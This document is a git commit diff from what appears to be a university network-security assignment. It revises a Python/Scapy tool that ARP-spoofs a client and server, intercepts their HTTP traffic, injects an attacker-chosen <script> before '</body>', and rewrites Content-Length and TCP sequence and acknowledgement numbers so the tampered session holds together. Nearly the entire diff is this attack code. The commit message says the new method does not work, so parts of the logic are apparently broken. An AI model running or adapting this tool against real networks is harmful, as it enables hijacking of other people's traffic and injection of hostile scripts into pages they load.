dffc540ce9c62c50aabe38c17d235cdfc6cb95ec
yhyuan2 <yhyuan2@illinois.edu>
2019-11-09 19:15:53 -0600

    New method but hard does not work

--- NetSec/cp2.1.http.py
+++ NetSec/cp2.1.http.py
@@ -53,126 +53,211 @@ def restore(srcIP, srcMAC, dstIP, dstMAC):
 
 # TODO: handle intercepted packets
 def interceptor(packet):
-	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, portLength, resetPort, multiRes
+	global clientIP, serverIP, attackerMAC
 	if packet[Ether].src == attackerMAC:
 		return
 	
-	payload = '<script>' + script + '</script>'
+	# Packet is sent to attacker based on MAC dst
 	if packet.haslayer(IP) and packet[Ether].dst == attackerMAC:
+		# Request from client to server
 		if packet[IP].src == clientIP and packet[IP].dst == serverIP:
-			# Request from client to server
-			oriAck = 0
-			if packet.haslayer(TCP):
-				if packet[TCP].sport in portLength:
-					# Change ackowledgement number to what server wants to see.
-					# Record ackowledgement number from the request.
-					portLength[packet[TCP].sport][0] = packet[TCP].ack
-					oriAck = packet[TCP].ack
-					for index, element in enumerate(portLength[packet[TCP].sport]):
-						if index > 0:
-							packet[TCP].ack = packet[TCP].ack - element
-				if packet[TCP].flags != "FA":
-					print("# Request")
-				elif packet[TCP].flags == "FA":
-					print("# Finish")
-				if packet[TCP].sport in resetPort:
-					if packet[TCP].sport in portLength:
-						portLength.pop(packet[TCP].sport)
-					resetPort.pop(packet[TCP].sport)
-				print(f"\tflags: {packet[TCP].flags}")
-				print(f"\tsrc: {packet[TCP].sport}")
-				print(f"\tseq: {packet[TCP].seq}")
-				print(f"\told ack: {oriAck}")
-				print(f"\tnew ack: {packet[TCP].ack}")
-				if packet[TCP].sport in portLength:
-					print(f"\t{packet[TCP].sport}:{portLength[packet[TCP].sport]}")
-				del packet[IP].len
-				del packet[IP].chksum
-				del packet[TCP].chksum
-			packet[Ether].src = attackerMAC
-			packet[Ether].dst = serverMAC
-			frags = fragment(packet, fragsize = 500)
-			for frag in frags:
-				sendp(frag)
+			cRequestS(packet)
+		# Response from server to client
 		elif packet[IP].src == serverIP and packet[IP].dst == clientIP:
-			# Response from server to client
-			oriSeq = 0
+			sResponseC(packet)
+
+
+def cRequestS(packet):
+	global serverMAC, attackerMAC, portLength, resetPort, multiRes, clientExpSA, serverExpSA
+	
+	oriAck = 0
+	if packet.haslayer(TCP):
+		if packet[TCP].flags != "S":
+			tcpLoad = len(packet[TCP]) - packet[TCP].dataofs*4
+			if tcpLoad == 0:
+				tcpLoad = 1
+			if packet[TCP].sport in serverExpSA:
+				oriLen = len(serverExpSA[packet[TCP].sport])
+				for pair in serverExpSA[packet[TCP].sport]:
+					if packet[TCP].seq == pair[0]:
+						if packet[TCP].sport in clientExpSA:
+							if packet[TCP].flags != "FA":
+								for p in reversed(clientExpSA[packet[TCP].sport]):
+									if p[0] == packet[TCP].ack and p[1] - packet[TCP].seq == 1:
+										p[1] = packet[TCP].seq + tcpLoad
+										break
+								if packet[TCP].flags == "PA":
+									clientExpSA[packet[TCP].sport].append([packet[TCP].ack, packet[TCP].seq + tcpLoad])
+								clientExpSA[packet[TCP].sport].append([packet[TCP].ack, packet[TCP].seq + tcpLoad])
+							else:
+								clientExpSA[packet[TCP].sport].clear()
+								clientExpSA[packet[TCP].sport] = [[packet[TCP].ack, packet[TCP].seq + tcpLoad]]
+							sorted(clientExpSA[packet[TCP].sport],key=lambda l:l[0])
+						else:
+							clientExpSA[packet[TCP].sport] = [[packet[TCP].ack, packet[TCP].seq + tcpLoad]]
+						oriAck = packet[TCP].ack
+						packet[TCP].ack = pair[1]
+						if packet[TCP].flags == "PA":
+							serverExpSA[packet[TCP].sport].clear()
+						else:
+							serverExpSA[packet[TCP].sport].remove(pair)
+						break
+				if not len(serverExpSA[packet[TCP].sport]) < oriLen:
+					return
+		
+		if packet[TCP].sport in resetPort:
+			if packet[TCP].sport in serverExpSA:
+				serverExpSA.pop(packet[TCP].sport)
+			if packet[TCP].sport in clientExpSA:
+				clientExpSA.pop(packet[TCP].sport)
+			if packet[TCP].sport in multiRes:
+				multiRes.pop(packet[TCP].sport)
+		
+		if packet[TCP].flags != "FA":
+			print("# Request")
+		else:
+			print("# Finish")
+		print(f"\tflags: {packet[TCP].flags}")
+		print(f"\tsrc: {packet[TCP].sport}")
+		print(f"\tseq: {packet[TCP].seq}")
+		print(f"\told ack: {oriAck}")
+		print(f"\tnew ack: {packet[TCP].ack}")
+		if packet[TCP].sport in portLength:
+			print(f"\tportLength {packet[TCP].sport}:{portLength[packet[TCP].sport]}")
+		if packet[TCP].sport in multiRes:
+			print(f"\tmultiRes {packet[TCP].sport}:{multiRes[packet[TCP].sport]}")
+		if packet[TCP].sport in clientExpSA:
+			print(f"\tclientExpSA {packet[TCP].sport}:{clientExpSA[packet[TCP].sport]}")
+		if packet[TCP].sport in serverExpSA:
+			print(f"\tserverExpSA {packet[TCP].sport}:{serverExpSA[packet[TCP].sport]}")
+		
+		# Delete checksum to make hosts do not check integrity.
+		del packet[IP].len
+		del packet[IP].chksum
+		del packet[TCP].chksum
+	
+	# Change MAC src and dst, then fragment packets.
+	packet[Ether].src = attackerMAC
+	packet[Ether].dst = serverMAC
+	
+	frags = fragment(packet, fragsize = 1000)
+	for frag in frags:
+		sendp(frag)
+
+
+def sResponseC(packet):
+	global clientMAC, attackerMAC, payload, portLength, resetPort, multiRes, clientExpSA, serverExpSA
+	
+	oriSeq = 0
+	httpLoad = 0
+	oriHttpLen = 0
+	# Packet has http load.
+	if packet.haslayer(Raw):
+		# Add payload.
+		httpLoad = packet[Raw].load.decode('utf-8')
+		print(httpLoad)
+		oriHttpLen = len(httpLoad)
+		httpLoad = httpLoad.replace('</body>', payload + '</body>')
+		
+		# Change content length in http header.
+		try:
+			loadSubString = httpLoad.split()
+			index = loadSubString.index('Content-Length:')
+			length = int(loadSubString[index+1])
+			newLength = length + len(payload)
+			lenDiff = len(payload) + len(str(newLength)) - len(str(length))
+			httpLoad = httpLoad.replace('Content-Length: ' + str(length), 'Content-Length: ' + str(newLength))
+		except:
+			pass
+		packet[Raw].load = httpLoad.encode('utf-8')
+	
+	# If TCP flag is FA, raise a flag so that
+	# we can close connection when receiving ack from client.
+	# Delete checksum to make hosts do not check integrity.
+	if packet.haslayer(TCP):
+		if packet[TCP].flags == "FA":
+			resetPort[packet[TCP].dport] = True
+		
+		
+		if packet[TCP].flags != "SA":
 			if packet.haslayer(Raw):
-				# Add payload.
-				httpLoad = packet[Raw].load.decode('utf-8')
-				httpLoad = httpLoad.replace('</body>', payload + '</body>')
-				
-				# Change sequence number to what client wants to see.
-				if packet[TCP].dport in portLength:
-					oriSeq = packet[TCP].seq
-					if packet[TCP].dport in multiRes:
-						# If it is not first segment, rebase it.
-						# Only rebase it if it is not in first response.
-						diff = packet[TCP].seq - multiRes[packet[TCP].dport]
-						if portLength[packet[TCP].dport][0] != 0:
-							packet[TCP].seq = portLength[packet[TCP].dport][0] + diff
-					else:
-						# Sequence number of first segment is acknowledgement number from request.
-						packet[TCP].seq = portLength[packet[TCP].dport][0]
-				
-				# Store sequence number of first segment.
-				if packet[TCP].dport not in multiRes:
-					if oriSeq == 0:
-						multiRes[packet[TCP].dport] = packet[TCP].seq
-					else:
-						multiRes[packet[TCP].dport] = oriSeq
-				
-				# Clear record if it is last segment.
-				if packet[TCP].flags == "PA" and packet[TCP].dport in multiRes:
-					multiRes.pop(packet[TCP].dport)
-				
-				# Change content length in http header.
-				try:
-					loadSubString = httpLoad.split()
-					index = loadSubString.index('Content-Length:')
-					length = int(loadSubString[index+1])
-					newLength = length + len(payload)
-					lenDiff = len(payload) + len(str(newLength)) - len(str(length))
-					if packet[TCP].dport in portLength:
-						# Record original content length of http load, length difference and
-						# increment number of responses.
-						if packet[TCP].flags != "FA":
-							portLength[packet[TCP].dport].append(lenDiff)
-					else:
-						# Record original content length of http load, length difference and
-						# first response.
-						portLength[packet[TCP].dport] = [0, lenDiff]
-					httpLoad = httpLoad.replace('Content-Length: ' + str(length), 'Content-Length: ' + str(newLength))
-				except:
-					pass
-				packet[Raw].load = httpLoad.encode('utf-8')
-				del packet[IP].len
-				del packet[IP].chksum
-				del packet[TCP].chksum
-			elif packet.haslayer(TCP):
-				if packet[TCP].dport in portLength:
-					# Change sequence number to what client wants to see.
-					oriSeq = packet[TCP].seq
-					packet[TCP].seq = portLength[packet[TCP].dport][0]
-				del packet[IP].len
-				del packet[IP].chksum
-				del packet[TCP].chksum
-			if packet.haslayer(TCP):
-				if packet[TCP].flags == "FA":
-					resetPort[packet[TCP].dport] = True
-				print("# Response")
-				print(f"\tflags: {packet[TCP].flags}")
-				print(f"\tdst: {packet[TCP].dport}")
-				print(f"\told seq: {oriSeq}")
-				print(f"\tnew seq: {packet[TCP].seq}")
-				print(f"\tack: {packet[TCP].ack}")
-			if packet[TCP].dport in portLength:
-				print(f"\t{packet[TCP].dport}:{portLength[packet[TCP].dport]}")
-			packet[Ether].src = attackerMAC
-			packet[Ether].dst = clientMAC
-			frags = fragment(packet, fragsize = 500)
-			for frag in frags:
-				sendp(frag)
+				tcpLoad = len(packet[TCP]) - packet[TCP].dataofs*4 - len(httpLoad) + oriHttpLen
+			else:
+				tcpLoad = len(packet[TCP]) - packet[TCP].dataofs*4
+			if tcpLoad == 0:
+				tcpLoad = 1
+			
+			if packet[TCP].dport in clientExpSA:
+				oriLen = len(clientExpSA[packet[TCP].dport])
+				for pair in clientExpSA[packet[TCP].dport]:
+					if packet[TCP].ack == pair[1]:
+						if packet[TCP].dport in serverExpSA:
+							for p in reversed(serverExpSA[packet[TCP].dport]):
+								if p[0] == packet[TCP].ack and p[1] - packet[TCP].seq == 1:
+									p[1] = packet[TCP].seq + tcpLoad
+									break
+							if packet[TCP].flags == "PA":
+								serverExpSA[packet[TCP].dport].append([packet[TCP].ack, packet[TCP].seq + tcpLoad])
+							serverExpSA[packet[TCP].dport].append([packet[TCP].ack, packet[TCP].seq + tcpLoad])
+							sorted(serverExpSA[packet[TCP].dport],key=lambda l:l[0])
+						else:
+							serverExpSA[packet[TCP].dport] = [[packet[TCP].ack, packet[TCP].seq + tcpLoad]]
+						if packet[TCP].dport not in multiRes:
+							multiRes[packet[TCP].dport] = packet[TCP].seq
+						oriSeq = packet[TCP].seq
+						if packet.haslayer(Raw):
+							if (packet[TCP].seq - pair[0]) > (len(httpLoad) - oriHttpLen):
+								diff = pair[0] - multiRes[packet[TCP].dport]
+								print(diff)
+								packet[TCP].seq = packet[TCP].seq + diff
+							else:
+								packet[TCP].seq = pair[0]
+						else:
+							packet[TCP].seq = pair[0]
+						if packet[TCP].flags == "PA":
+							clientExpSA[packet[TCP].dport].clear()
+							multiRes.pop(packet[TCP].dport)
+						else:
+							clientExpSA[packet[TCP].dport].remove(pair)
+						break
+				if not len(clientExpSA[packet[TCP].dport]) < oriLen:
+					return
+			else:
+				if packet[TCP].dport in serverExpSA:
+					for p in reversed(serverExpSA[packet[TCP].dport]):
+						if p[0] == packet[TCP].ack:
+							p[1] = packet[TCP].seq + tcpLoad
+							break
+					serverExpSA[packet[TCP].dport].append([packet[TCP].ack, packet[TCP].seq + tcpLoad])
+					sorted(serverExpSA[packet[TCP].dport],key=lambda l:l[0])
+				else:
+					serverExpSA[packet[TCP].dport] = [[packet[TCP].ack, packet[TCP].seq + tcpLoad]]
+		
+		del packet[IP].len
+		del packet[IP].chksum
+		del packet[TCP].chksum
+		print("# Response")
+		print(f"\tflags: {packet[TCP].flags}")
+		print(f"\tdst: {packet[TCP].dport}")
+		print(f"\told seq: {oriSeq}")
+		print(f"\tnew seq: {packet[TCP].seq}")
+		print(f"\tack: {packet[TCP].ack}")
+	if packet[TCP].dport in portLength:
+		print(f"\tportLength {packet[TCP].dport}:{portLength[packet[TCP].dport]}")
+	if packet[TCP].dport in multiRes:
+		print(f"\tmultiRes {packet[TCP].dport}:{multiRes[packet[TCP].dport]}")
+	if packet[TCP].dport in clientExpSA:
+		print(f"\tclientExpSA {packet[TCP].dport}:{clientExpSA[packet[TCP].dport]}")
+	if packet[TCP].dport in serverExpSA:
+		print(f"\tserverExpSA {packet[TCP].dport}:{serverExpSA[packet[TCP].dport]}")
+	
+	# Change MAC src and dst, then fragment packets.
+	packet[Ether].src = attackerMAC
+	packet[Ether].dst = clientMAC
+	
+	frags = fragment(packet, fragsize = 1000)
+	for frag in frags:
+		sendp(frag)
 
 
 if __name__ == "__main__":
@@ -188,17 +273,25 @@ if __name__ == "__main__":
 	script = args.script
 	if script is None:
 		script = 'alert("Successful Injection!")'
+	payload = '<script>' + script + '</script>'
 
 	clientMAC = mac(clientIP)
 	serverMAC = mac(serverIP)
 	attackerMAC = get_if_hwaddr(args.interface)
 	
-	# dictionary of [ack from request, 1st lenDiff, 2nd lenDiff, ...]
+	# dictionary of {port: [1st lenDiff, 2nd lenDiff, ...], ...}
 	portLength = {}
 	
+	# dictionary of {port: True, ...}
+	# Raise a flag for closing connection.
 	resetPort = {}
 	
+	# dictionary of {port: seq number, ...}
+	# Store seq of first segment from response.
 	multiRes = {}
+	
+	clientExpSA = {}
+	serverExpSA = {}
 
 	# start a new thread to ARP spoof in a loop
 	spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
